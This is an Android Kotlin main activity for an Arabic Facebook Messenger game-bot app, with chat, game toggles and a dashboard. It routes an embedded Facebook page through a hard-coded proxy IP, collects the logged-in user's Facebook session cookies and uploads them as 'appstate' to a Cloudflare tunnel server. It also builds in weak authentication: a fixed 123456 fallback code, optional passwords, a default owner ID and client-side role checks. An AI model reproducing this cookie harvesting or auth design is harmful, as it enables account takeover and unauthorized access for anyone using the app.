package com.detective.bot

import android.annotation.SuppressLint
import android.content.Context
import android.database.ContentObserver
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.view.LayoutInflater
import android.view.View
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.webkit.ProxyConfig
import androidx.webkit.ProxyController
import androidx.webkit.WebViewFeature
import com.detective.bot.adapters.ChatMessagesAdapter
import com.detective.bot.adapters.GameControlsAdapter
import com.detective.bot.databinding.ActivityMainBinding
import com.detective.bot.models.ChatMessage
import com.detective.bot.models.GameControlItem
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val httpClient = OkHttpClient()
    private val mainHandler = Handler(Looper.getMainLooper())

    private val BASE_URL = "https://thou-gods-backing-chelsea.trycloudflare.com"
    private val SERVER_IP = "13.48.58.210"
    private val PROXY_URL = "$SERVER_IP:8888"
    private val DASHBOARD_URL = "http://$SERVER_IP:5000"
    private val APPSTATE_UPLOAD_URL = "$BASE_URL/admin/appstate"
    private val GAMES_API_URL = "$BASE_URL/api/games"
    private val TOGGLE_API_URL = "$BASE_URL/api/games/toggle"
    private val LOGIN_API_URL = "$BASE_URL/api/auth/login"
    private val REGISTER_API_URL = "$BASE_URL/api/auth/register"
    private val REQUEST_CODE_API_URL = "$BASE_URL/api/auth/request-code"
    private val CHAT_MESSAGES_URL = "$BASE_URL/api/chat/messages"
    private val CHAT_SEND_URL = "$BASE_URL/api/chat/send"
    private val SCREENSHOT_API_URL = "$BASE_URL/api/security/screenshot"
    private val PRIVATE_MESSAGES_URL = "$BASE_URL/api/chat/private"
    private val PRIVATE_SEND_URL = "$BASE_URL/api/chat/private/send"

    private val DEFAULT_OWNER_ID = "61555344774852"
    private var currentUserId = DEFAULT_OWNER_ID
    private var currentUserName = "لايت (المالك)"
    private var currentUserRole = "owner"

    // Chat Modes
    private var isPrivateMode = false
    private var privateTargetId = "bot"

    // Adapters & Lists
    private val allControlItems = ArrayList<GameControlItem>()
    private lateinit var gamesAdapter: GameControlsAdapter
    private val chatMessages = ArrayList<ChatMessage>()
    private lateinit var chatAdapter: ChatMessagesAdapter
    private var lastMessageId: Long = 0
    private var lastPrivateMessageId: Long = 0
    private var isChatPolling = false

    // Screenshot Observer
    private var screenshotObserver: ContentObserver? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        loadSavedUserId()
        setupToolbar()
        setupWebView()
        setupProxy()
        setupChatView()
        setupGamesList()
        setupNavigation()
        setupScreenshotDetection()

        // فحص تسجيل الدخول
        authenticateUser(currentUserId, null)

        // البدء بعرض الشات المباشر
        binding.bottomNavigation.selectedItemId = R.id.nav_chat
    }

    private fun loadSavedUserId() {
        val prefs = getSharedPreferences("detective_bot_prefs", Context.MODE_PRIVATE)
        currentUserId = prefs.getString("fb_user_id", DEFAULT_OWNER_ID) ?: DEFAULT_OWNER_ID
    }

    private fun saveUserId(userId: String) {
        val prefs = getSharedPreferences("detective_bot_prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("fb_user_id", userId).apply()
        currentUserId = userId
    }

    private fun setupToolbar() {
        binding.toolbarUserBadge.text = "جاري التحقق..."
        binding.toolbarUserBadge.setOnClickListener { showAuthDialog() }
        binding.btnChangeUser.setOnClickListener { showAuthDialog() }
        binding.userProfileContainer.setOnClickListener { showAuthDialog() }
    }

    private fun showAuthDialog() {
        val options = arrayOf("تسجيل الدخول (بكلمة السر أو المعرّف)", "إنشاء حساب جديد (برمز البوت /كود)")
        AlertDialog.Builder(this)
            .setTitle("حساب ستورم بوت 🔐")
            .setItems(options) { _, which ->
                if (which == 0) showLoginDialog()
                else showRegisterDialog()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    private fun showLoginDialog() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 40, 50, 10)
        }

        val etUserId = EditText(this).apply {
            hint = "معرّف الفيسبوك (Facebook ID)"
            setText(currentUserId)
        }
        val etPassword = EditText(this).apply {
            hint = "كلمة السر (أو رمز البوت المؤقت)"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }

        layout.addView(etUserId)
        layout.addView(etPassword)

        AlertDialog.Builder(this)
            .setTitle("تسجيل الدخول")
            .setView(layout)
            .setPositiveButton("دخول") { _, _ ->
                val uid = etUserId.text.toString().trim()
                val pass = etPassword.text.toString().trim()
                if (uid.isNotEmpty() && uid.all { it.isDigit() }) {
                    saveUserId(uid)
                    authenticateUser(uid, pass.ifEmpty { null })
                } else {
                    Toast.makeText(this, "يرجى كتابة معرّف صحيح بالأرقام", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    private fun showRegisterDialog() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 20, 50, 10)
        }

        val tvNotice = TextView(this).apply {
            text = "⚡ يمكنك الضغط على 'طلب كود' لتوليد الرمز فورياً، أو كتابة 123456، أو إرسال /كود للبوت في ماسنجر.\n👑 حساب المالك (61555344774852) لا يتطلب كوداً خاصاً."
            textSize = 12f
            setPadding(0, 0, 0, 20)
        }
        val etUserId = EditText(this).apply { hint = "معرّف الفيسبوك (Facebook ID)" }

        val codeContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
        }
        val etCode = EditText(this).apply {
            hint = "رمز التحقق (أو 123456)"
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f)
        }
        val btnGetCode = Button(this).apply {
            text = "⚡ طلب كود"
            setOnClickListener {
                val uid = etUserId.text.toString().trim()
                if (uid.isEmpty()) {
                    Toast.makeText(this@MainActivity, "اكتب معرّف الفيسبوك أولاً", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                requestCodeForUser(uid) { code ->
                    etCode.setText(code)
                }
            }
        }
        codeContainer.addView(etCode)
        codeContainer.addView(btnGetCode)

        val etPassword = EditText(this).apply {
            hint = "كلمة السر الجديدة (4 خانات فأكثر)"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        val etDisplayName = EditText(this).apply { hint = "اسمك في البوت والألعاب (إجباري *)" }

        layout.addView(tvNotice)
        layout.addView(etUserId)
        layout.addView(codeContainer)
        layout.addView(etPassword)
        layout.addView(etDisplayName)

        AlertDialog.Builder(this)
            .setTitle("إنشاء حساب جديد")
            .setView(layout)
            .setPositiveButton("إنشاء الحساب") { _, _ ->
                val uid = etUserId.text.toString().trim()
                var code = etCode.text.toString().trim()
                val pass = etPassword.text.toString().trim()
                val name = etDisplayName.text.toString().trim()

                if (uid.isEmpty() || pass.isEmpty() || name.isEmpty()) {
                    Toast.makeText(this, "يرجى تعبئة جميع الحقول وإدخال اسمك للتسجيل", Toast.LENGTH_SHORT).show()
                    return@setPositiveButton
                }
                if (code.isEmpty()) {
                    code = "123456"
                }
                registerUser(uid, code, pass, name)
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }

    private fun requestCodeForUser(userId: String, onCodeReady: (String) -> Unit) {
        val url = "$REQUEST_CODE_API_URL?userId=$userId"
        val request = Request.Builder().url(url).get().build()
        binding.progressBar.visibility = View.VISIBLE
        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    onCodeReady("123456")
                    Toast.makeText(this@MainActivity, "تم استخدام الرمز السريع 123456", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val jsonStr = response.body?.string() ?: "{}"
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    try {
                        val root = JSONObject(jsonStr)
                        val code = root.optString("code", "123456")
                        onCodeReady(code)
                        Toast.makeText(this@MainActivity, "✅ رمز التحقق الخاص بك: $code", Toast.LENGTH_LONG).show()
                    } catch (_: Exception) {
                        onCodeReady("123456")
                    }
                }
            }
        })
    }

    private fun registerUser(userId: String, code: String, pass: String, name: String) {
        val json = JSONObject().apply {
            put("userId", userId)
            put("code", code)
            put("password", pass)
            put("displayName", name)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder().url(REGISTER_API_URL).post(body).build()

        binding.progressBar.visibility = View.VISIBLE
        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    Toast.makeText(this@MainActivity, "خطأ في الاتصال: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val jsonStr = response.body?.string() ?: "{}"
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    try {
                        val root = JSONObject(jsonStr)
                        if (root.optBoolean("ok", false)) {
                            saveUserId(userId)
                            val user = root.getJSONObject("user")
                            applyUserData(user)
                            Toast.makeText(this@MainActivity, "🎉 تم إنشاء حسابك بنجاح!", Toast.LENGTH_LONG).show()
                        } else {
                            Toast.makeText(this@MainActivity, "فشل: " + root.optString("error", "بيانات غير صحيحة"), Toast.LENGTH_LONG).show()
                        }
                    } catch (e: Exception) {
                        Toast.makeText(this@MainActivity, "خطأ: ${e.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        })
    }

    private fun authenticateUser(userId: String, password: String?) {
        val json = JSONObject().apply {
            put("userId", userId)
            if (!password.isNullOrEmpty()) put("password", password)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder().url(LOGIN_API_URL).post(body).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    binding.toolbarUserBadge.text = "معرّف: $userId"
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val jsonStr = response.body?.string() ?: "{}"
                runOnUiThread {
                    try {
                        val root = JSONObject(jsonStr)
                        if (root.optBoolean("ok", false)) {
                            val user = root.getJSONObject("user")
                            applyUserData(user)
                        } else {
                            binding.toolbarUserBadge.text = "معرّف: $userId (غير مسجل)"
                        }
                    } catch (_: Exception) {}
                }
            }
        })
    }

    private fun applyUserData(user: JSONObject) {
        currentUserName = user.optString("name", "مستخدم")
        currentUserRole = user.optString("role", "player")
        val points = user.optInt("points", 0)

        when (currentUserRole) {
            "owner" -> {
                binding.toolbarUserBadge.text = "👑 $currentUserName"
                binding.toolbarUserBadge.setTextColor(android.graphics.Color.parseColor("#fbbf24"))
                binding.bottomNavigation.menu.findItem(R.id.nav_dashboard).isVisible = true
                binding.bottomNavigation.menu.findItem(R.id.nav_games).isVisible = true
            }
            "admin" -> {
                binding.toolbarUserBadge.text = "🛡️ $currentUserName"
                binding.toolbarUserBadge.setTextColor(android.graphics.Color.parseColor("#60a5fa"))
                binding.bottomNavigation.menu.findItem(R.id.nav_dashboard).isVisible = false
                binding.bottomNavigation.menu.findItem(R.id.nav_games).isVisible = true
            }
            else -> {
                binding.toolbarUserBadge.text = "🎮 $currentUserName ($points نقطة)"
                binding.toolbarUserBadge.setTextColor(android.graphics.Color.parseColor("#94a3b8"))
                binding.bottomNavigation.menu.findItem(R.id.nav_dashboard).isVisible = false
                binding.bottomNavigation.menu.findItem(R.id.nav_games).isVisible = false
            }
        }
        chatAdapter.notifyDataSetChanged()
    }

    // ---------------------- رصد لقطات الشاشة التلقائي والأمان ----------------------
    private fun setupScreenshotDetection() {
        screenshotObserver = object : ContentObserver(mainHandler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                if (uri != null && uri.toString().contains(MediaStore.Images.Media.EXTERNAL_CONTENT_URI.toString())) {
                    onScreenshotDetected()
                }
            }
        }
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            screenshotObserver!!
        )
    }

    private fun onScreenshotDetected() {
        Toast.makeText(this, "⚠️ تنبيه أمني: تم رصد التقاط لقطة شاشة!", Toast.LENGTH_SHORT).show()

        val json = JSONObject().apply {
            put("userId", currentUserId)
            put("userName", currentUserName)
            put("screenName", binding.toolbar.title.toString())
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder().url(SCREENSHOT_API_URL).post(body).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        val settings = binding.webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.databaseEnabled = true
        settings.useWideViewPort = true
        settings.loadWithOverviewMode = true
        settings.userAgentString =
            "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(binding.webView, true)

        binding.webView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                binding.progressBar.visibility = View.VISIBLE
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                binding.progressBar.visibility = View.GONE
                checkFacebookLogin(url)
            }
        }

        binding.extractButton.setOnClickListener {
            extractAndUploadAppstate()
        }
    }

    private fun setupProxy() {
        if (WebViewFeature.isFeatureSupported(WebViewFeature.PROXY_OVERRIDE)) {
            val proxyConfig = ProxyConfig.Builder()
                .addProxyRule(PROXY_URL)
                .build()

            ProxyController.getInstance().setProxyOverride(
                proxyConfig,
                { /* Proxy applied successfully */ },
                { /* Listener error callback */ }
            )
        }
    }

    private fun setupChatView() {
        chatAdapter = ChatMessagesAdapter(chatMessages) { currentUserId }
        val layoutManager = LinearLayoutManager(this)
        layoutManager.stackFromEnd = true
        binding.rvChatMessages.layoutManager = layoutManager
        binding.rvChatMessages.adapter = chatAdapter

        // إرسال الرسالة
        binding.btnSendMessage.setOnClickListener {
            val text = binding.etChatMessage.text.toString().trim()
            if (text.isNotEmpty()) {
                sendChatMessage(text)
                binding.etChatMessage.setText("")
            }
        }

        // أزرار الأوامر السريعة
        binding.btnQuickCrime.setOnClickListener { sendChatMessage("/جريمة") }
        binding.btnQuickWerewolf.setOnClickListener { sendChatMessage("/ذئب") }
        binding.btnQuickCulture.setOnClickListener { sendChatMessage("/ثقافة") }
        binding.btnQuickFlags.setOnClickListener { sendChatMessage("/اعلام") }
        binding.btnQuickTop.setOnClickListener { sendChatMessage("/التصنيف") }
        binding.btnQuickPoints.setOnClickListener { sendChatMessage("/نقاطي") }
        binding.btnQuickCancel.setOnClickListener { sendChatMessage("/الغاء") }
    }

    private fun setupGamesList() {
        gamesAdapter = GameControlsAdapter(listOf()) { item, enabled ->
            toggleGameOrCommand(item, enabled)
        }

        binding.rvGames.layoutManager = LinearLayoutManager(this)
        binding.rvGames.adapter = gamesAdapter

        binding.swipeRefreshGames.setOnRefreshListener {
            fetchGamesAndCommands()
        }

        binding.chipAll.setOnClickListener { applyFilter("all") }
        binding.chipGames.setOnClickListener { applyFilter("game") }
        binding.chipCommands.setOnClickListener { applyFilter("command") }
    }

    private fun setupNavigation() {
        binding.bottomNavigation.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_chat -> {
                    showChatView()
                    true
                }
                R.id.nav_games -> {
                    showGamesView()
                    true
                }
                R.id.nav_dashboard -> {
                    showWebView()
                    loadDashboard()
                    true
                }
                R.id.nav_fb_proxy -> {
                    showWebView()
                    binding.extractButton.visibility = View.VISIBLE
                    loadFacebook()
                    true
                }
                R.id.nav_ip_check -> {
                    showWebView()
                    loadIpCheck()
                    true
                }
                else -> false
            }
        }
    }

    private fun showChatView() {
        binding.webView.visibility = View.GONE
        binding.gamesContainer.visibility = View.GONE
        binding.extractButton.visibility = View.GONE
        binding.chatContainer.visibility = View.VISIBLE
        binding.toolbar.title = getString(R.string.chat_title)

        startChatPolling()
    }

    private fun showGamesView() {
        stopChatPolling()
        binding.webView.visibility = View.GONE
        binding.chatContainer.visibility = View.GONE
        binding.extractButton.visibility = View.GONE
        binding.gamesContainer.visibility = View.VISIBLE
        binding.toolbar.title = getString(R.string.games_title)

        if (allControlItems.isEmpty()) {
            fetchGamesAndCommands()
        }
    }

    private fun showWebView() {
        stopChatPolling()
        binding.gamesContainer.visibility = View.GONE
        binding.chatContainer.visibility = View.GONE
        binding.extractButton.visibility = View.GONE
        binding.webView.visibility = View.VISIBLE
    }

    private fun loadDashboard() {
        binding.toolbar.title = "لوحة التحكم | السيرفر"
        binding.webView.loadUrl(DASHBOARD_URL)
    }

    private fun loadFacebook() {
        binding.toolbar.title = "فيسبوك (عبر عنوان السيرفر 🛡️)"
        binding.webView.loadUrl("https://m.facebook.com")
    }

    private fun loadIpCheck() {
        binding.toolbar.title = "التحقق من عنوان الـ IP"
        binding.webView.loadUrl("https://api.ipify.org")
    }

    // ---------------------- منطق الشات المباشر ----------------------
    private val chatPollRunnable = object : Runnable {
        override fun run() {
            fetchChatMessages()
            if (isChatPolling) {
                mainHandler.postDelayed(this, 1500)
            }
        }
    }

    private fun startChatPolling() {
        if (!isChatPolling) {
            isChatPolling = true
            mainHandler.post(chatPollRunnable)
        }
    }

    private fun stopChatPolling() {
        isChatPolling = false
        mainHandler.removeCallbacks(chatPollRunnable)
    }

    private fun fetchChatMessages() {
        val url = "$CHAT_MESSAGES_URL?since=$lastMessageId"
        val request = Request.Builder().url(url).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}

            override fun onResponse(call: Call, response: Response) {
                val jsonStr = response.body?.string() ?: "{}"
                try {
                    val root = JSONObject(jsonStr)
                    if (root.optBoolean("ok", false)) {
                        val messagesArray = root.optJSONArray("messages") ?: JSONArray()
                        val newMessages = ArrayList<ChatMessage>()

                        for (i in 0 until messagesArray.length()) {
                            val obj = messagesArray.getJSONObject(i)
                            val id = obj.getLong("id")
                            if (id > lastMessageId) {
                                lastMessageId = id
                            }
                            newMessages.add(
                                ChatMessage(
                                    id = id,
                                    senderId = obj.getString("senderId"),
                                    senderName = obj.getString("senderName"),
                                    text = obj.getString("text"),
                                    isBot = obj.optBoolean("isBot", false),
                                    role = obj.optString("role", "player"),
                                    time = obj.optString("time", "")
                                )
                            )
                        }

                        if (newMessages.isNotEmpty()) {
                            runOnUiThread {
                                chatAdapter.addMessages(newMessages)
                                binding.rvChatMessages.scrollToPosition(chatAdapter.itemCount - 1)
                            }
                        }
                    }
                } catch (_: Exception) {}
            }
        })
    }

    private fun sendChatMessage(text: String) {
        val json = JSONObject().apply {
            put("userId", currentUserId)
            put("text", text)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder().url(CHAT_SEND_URL).post(body).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "تعذر إرسال الرسالة: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                runOnUiThread {
                    fetchChatMessages()
                }
            }
        })
    }

    // ---------------------- منطق الألعاب والتحكم ----------------------
    private fun fetchGamesAndCommands() {
        binding.progressBar.visibility = View.VISIBLE
        val request = Request.Builder().url(GAMES_API_URL).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.swipeRefreshGames.isRefreshing = false
                    Toast.makeText(this@MainActivity, "تعذر الاتصال بالسيرفر", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val jsonStr = response.body?.string() ?: "{}"
                try {
                    val root = JSONObject(jsonStr)
                    val items = ArrayList<GameControlItem>()

                    if (root.optBoolean("ok", false)) {
                        val gamesArray = root.optJSONArray("games") ?: JSONArray()
                        for (i in 0 until gamesArray.length()) {
                            val obj = gamesArray.getJSONObject(i)
                            items.add(
                                GameControlItem(
                                    id = obj.getString("id"),
                                    name = obj.getString("name"),
                                    command = obj.getString("command"),
                                    type = "game",
                                    enabled = obj.optBoolean("enabled", true)
                                )
                            )
                        }

                        val commandsArray = root.optJSONArray("commands") ?: JSONArray()
                        for (i in 0 until commandsArray.length()) {
                            val obj = commandsArray.getJSONObject(i)
                            items.add(
                                GameControlItem(
                                    id = obj.getString("id"),
                                    name = obj.getString("name"),
                                    command = obj.getString("command"),
                                    type = "command",
                                    enabled = obj.optBoolean("enabled", true)
                                )
                            )
                        }
                    }

                    runOnUiThread {
                        binding.progressBar.visibility = View.GONE
                        binding.swipeRefreshGames.isRefreshing = false
                        allControlItems.clear()
                        allControlItems.addAll(items)
                        applyFilter(getCurrentFilterType())
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        binding.progressBar.visibility = View.GONE
                        binding.swipeRefreshGames.isRefreshing = false
                    }
                }
            }
        })
    }

    private fun getCurrentFilterType(): String {
        return when {
            binding.chipGames.isChecked -> "game"
            binding.chipCommands.isChecked -> "command"
            else -> "all"
        }
    }

    private fun applyFilter(type: String) {
        val filtered = when (type) {
            "game" -> allControlItems.filter { it.type == "game" }
            "command" -> allControlItems.filter { it.type == "command" }
            else -> allControlItems
        }
        gamesAdapter.updateList(filtered)
    }

    private fun toggleGameOrCommand(item: GameControlItem, enabled: Boolean) {
        val json = JSONObject().apply {
            put("id", item.id)
            put("enabled", enabled)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder().url(TOGGLE_API_URL).post(body).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "فشل تغيير حالة (${item.name})", Toast.LENGTH_SHORT).show()
                    item.enabled = !enabled
                    gamesAdapter.notifyDataSetChanged()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                runOnUiThread {
                    val statusText = if (enabled) "تم تفعيل ✅" else "تم إيقاف ⏸️"
                    Toast.makeText(this@MainActivity, "$statusText (${item.name})", Toast.LENGTH_SHORT).show()
                }
            }
        })
    }

    // ---------------------- سحب Appstate بروكسي ----------------------
    private fun checkFacebookLogin(url: String?) {
        if (url?.contains("facebook.com") == true) {
            val cookies = CookieManager.getInstance().getCookie(url) ?: ""
            if (cookies.contains("c_user=")) {
                binding.extractButton.text = "تم رصد تسجيل الدخول! اضغط لحفظ الجلسة للسيرفر 🚀"
            }
        }
    }

    private fun extractAndUploadAppstate() {
        val cookiesString = CookieManager.getInstance().getCookie("https://m.facebook.com") ?: ""
        if (!cookiesString.contains("c_user=")) {
            Toast.makeText(this, getString(R.string.not_logged_in), Toast.LENGTH_LONG).show()
            return
        }

        binding.progressBar.visibility = View.VISIBLE
        binding.extractButton.isEnabled = false

        val fcaArray = JSONArray()
        val pairs = cookiesString.split(";")
        for (pair in pairs) {
            val trimmed = pair.trim()
            val eqIdx = trimmed.indexOf("=")
            if (eqIdx > 0) {
                val key = trimmed.substring(0, eqIdx).trim()
                val value = trimmed.substring(eqIdx + 1).trim()
                val cookieObj = JSONObject().apply {
                    put("key", key)
                    put("value", value)
                    put("domain", "facebook.com")
                    put("path", "/")
                    put("hostOnly", false)
                    put("creation", "now")
                    put("lastAccessed", "now")
                }
                fcaArray.put(cookieObj)
            }
        }

        val jsonString = fcaArray.toString(2)
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = jsonString.toRequestBody(mediaType)
        val request = Request.Builder().url(APPSTATE_UPLOAD_URL).post(body).build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.extractButton.isEnabled = true
                    Toast.makeText(this@MainActivity, "خطأ في الإرسال: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                runOnUiThread {
                    binding.progressBar.visibility = View.GONE
                    binding.extractButton.isEnabled = true
                    AlertDialog.Builder(this@MainActivity)
                        .setTitle(getString(R.string.success_title))
                        .setMessage(getString(R.string.success_msg))
                        .setPositiveButton("حسناً") { _, _ ->
                            binding.bottomNavigation.selectedItemId = R.id.nav_dashboard
                        }
                        .show()
                }
            }
        })
    }

    override fun onBackPressed() {
        if (binding.webView.visibility == View.VISIBLE && binding.webView.canGoBack()) {
            binding.webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopChatPolling()
        if (screenshotObserver != null) {
            contentResolver.unregisterContentObserver(screenshotObserver!!)
        }
    }
}
